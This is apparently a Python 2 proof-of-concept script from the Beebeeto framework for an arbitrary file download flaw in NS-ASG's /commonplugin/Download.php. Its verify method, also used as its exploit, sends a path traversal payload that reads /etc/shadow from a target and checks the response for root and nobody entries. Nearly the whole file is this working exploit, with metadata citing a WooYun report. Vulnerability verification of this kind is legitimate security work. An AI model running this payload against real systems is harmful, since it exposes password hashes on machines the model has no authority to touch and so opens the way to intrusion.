#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0207',
            'name': 'NS-ASG /commonplugin-Download.php 任意文件下载漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2014-12-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'NS-ASG',
            'vul_version': '*',
            'type': 'Arbitrary File Download',
            'tag': ['NS-ASG漏洞', '任意文件下载漏洞', '/commonplugin-Download.php', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2014-058838',
            ]
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/commonplugin/Download.php?licensefile=../../../../../../../../../../etc/shadow'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())